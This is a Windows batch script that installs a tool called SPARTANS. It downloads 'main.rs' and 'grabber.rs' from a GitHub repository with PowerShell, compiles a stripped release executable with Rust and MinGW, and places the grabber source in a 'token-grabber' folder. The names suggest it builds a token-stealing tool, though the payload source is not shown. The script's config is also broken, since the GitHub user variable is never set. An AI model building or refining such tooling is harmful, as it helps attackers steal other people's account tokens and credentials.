@echo off
setlocal EnableDelayedExpansion
title SPARTANS Installer v5.0 - GitHub
color 0A

cls
echo ========================================================================
echo          SPARTANS INSTALLER v5.0 - GITHUB INTEGRATION
echo ========================================================================
echo.

:: GitHub Configuration - CHANGE THESE
set "patronear"
set "GITHUB_REPO=spartans"
set "GITHUB_BRANCH=main"

set "MINGW_DIR=%USERPROFILE%\.mingw64"
set "CARGO_HOME=%USERPROFILE%\.cargo"
set "PATH=%MINGW_DIR%\bin;%CARGO_HOME%\bin;%PATH%"

set "INSTALL_DIR=%~dp0"
set "INSTALL_DIR=%INSTALL_DIR:~0,-1%"

echo [*] Installation directory: %INSTALL_DIR%
echo.

:: Download from GitHub
echo [1/7] Downloading source files from GitHub...

if not exist "%INSTALL_DIR%\main.rs" (
    echo     [*] Downloading main.rs...
    powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/%GITHUB_BRANCH%/main.rs' -OutFile '%INSTALL_DIR%\main.rs' -ErrorAction Stop } catch { exit 1 }" 2>nul
    
    if exist "%INSTALL_DIR%\main.rs" (
        echo     [OK] main.rs downloaded
    ) else (
        echo     [!] Failed - using local file if available
    )
) else (
    echo     [OK] main.rs found locally
)

if not exist "%INSTALL_DIR%\grabber.rs" (
    echo     [*] Downloading grabber.rs...
    powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/%GITHUB_BRANCH%/grabber.rs' -OutFile '%INSTALL_DIR%\grabber.rs' -ErrorAction Stop } catch { exit 1 }" 2>nul
    
    if exist "%INSTALL_DIR%\grabber.rs" (
        echo     [OK] grabber.rs downloaded
    ) else (
        echo     [!] Failed - using local file if available
    )
) else (
    echo     [OK] grabber.rs found locally
)

:: Verify files exist
if not exist "%INSTALL_DIR%\main.rs" (
    echo.
    echo [!] ERROR: main.rs not found
    echo.
    echo Please either:
    echo   1. Place main.rs in this folder manually
    echo   2. Update GitHub settings at top of this script
    echo   3. Make sure your GitHub repo is public
    echo.
    pause
    exit /b 1
)

if not exist "%INSTALL_DIR%\grabber.rs" (
    echo.
    echo [!] ERROR: grabber.rs not found
    echo.
    pause
    exit /b 1
)
echo.

:: Check MinGW
echo [2/7] Checking MinGW...
if not exist "%MINGW_DIR%\bin\gcc.exe" (
    echo     [!] MinGW NOT FOUND
    echo.
    echo Please install MinGW:
    echo   1. Download from: https://github.com/niXman/mingw-builds-binaries/releases
    echo   2. Extract to: %MINGW_DIR%
    echo.
    pause
    exit /b 1
)
echo     [OK] MinGW ready
echo.

:: Check Rust
echo [3/7] Checking Rust...
if not exist "%CARGO_HOME%\bin\rustc.exe" (
    echo     [!] Rust NOT FOUND
    echo.
    echo Please install Rust from: https://rustup.rs
    echo.
    pause
    exit /b 1
)
echo     [OK] Rust found
for /f "delims=" %%V in ('"%CARGO_HOME%\bin\rustc.exe" --version') do echo     [*] %%V
echo.

:: Check target
echo [4/7] Checking Rust target...
"%CARGO_HOME%\bin\rustup.exe" target list --installed | findstr /C:"x86_64-pc-windows-gnu" >nul 2>&1
if errorlevel 1 (
    echo     [*] Installing target...
    "%CARGO_HOME%\bin\rustup.exe" target add x86_64-pc-windows-gnu
    echo     [OK] Target installed
) else (
    echo     [OK] Target ready
)
echo.

:: Setup
echo [5/7] Setting up project...
set "SPARTANS_DIR=%INSTALL_DIR%\SPARTANS"
set "BUILD_DIR=%SPARTANS_DIR%\build"

if exist "%BUILD_DIR%" rmdir /s /q "%BUILD_DIR%" 2>nul

mkdir "%BUILD_DIR%\src" 2>nul
echo     [OK] Build directory ready

:: Create utilitys structure
mkdir "%SPARTANS_DIR%\utilitys\token-grabber" 2>nul
copy /y "%INSTALL_DIR%\grabber.rs" "%SPARTANS_DIR%\utilitys\token-grabber\main.rs" >nul 2>&1
echo     [OK] Created utilitys folder
echo.

:: Create Cargo.toml
echo [6/7] Creating project files...
(
echo [package]
echo name = "spartans"
echo version = "5.0.0"
echo edition = "2021"
echo.
echo [profile.release]
echo opt-level = "z"
echo lto = true
echo strip = true
echo codegen-units = 1
echo panic = "abort"
) > "%BUILD_DIR%\Cargo.toml"

copy /y "%INSTALL_DIR%\main.rs" "%BUILD_DIR%\src\main.rs" >nul 2>&1
echo     [OK] Project ready
echo.

:: Compile
echo [7/7] Compiling SPARTANS...
echo ========================================================================
echo.
echo [*] Building... (30-90 seconds)
echo.

cd /d "%BUILD_DIR%"
"%CARGO_HOME%\bin\cargo.exe" build --release --target x86_64-pc-windows-gnu 2>&1

echo.
echo ========================================================================
echo.

set "EXE_PATH=%BUILD_DIR%\target\x86_64-pc-windows-gnu\release\spartans.exe"

if exist "%EXE_PATH%" (
    echo.
    echo ********************************************************************
    echo *                 SUCCESS!                                        *
    echo ********************************************************************
    echo.
    
    for %%F in ("%EXE_PATH%") do set size=%%~zF
    set /a size_kb=!size! / 1024
    echo [+] SPARTANS.exe created - !size_kb! KB
    echo.
    
    copy /y "%EXE_PATH%" "%SPARTANS_DIR%\SPARTANS.exe" >nul 2>&1
    
    if exist "%SPARTANS_DIR%\SPARTANS.exe" (
        echo [+] Installation complete!
        echo.
        echo Location: %SPARTANS_DIR%
        echo.
        echo Files:
        echo   - SPARTANS.exe
        echo   - utilitys\token-grabber\main.rs
        echo.
        
        cd /d "%SPARTANS_DIR%"
        rmdir /s /q "%BUILD_DIR%" 2>nul
        echo [OK] Cleaned up
        echo.
    )
) else (
    echo.
    echo ********************************************************************
    echo *                 FAILED!                                         *
    echo ********************************************************************
    echo.
    echo Check compiler output above for errors
    echo.
)

cd /d "%INSTALL_DIR%"
echo.
pause
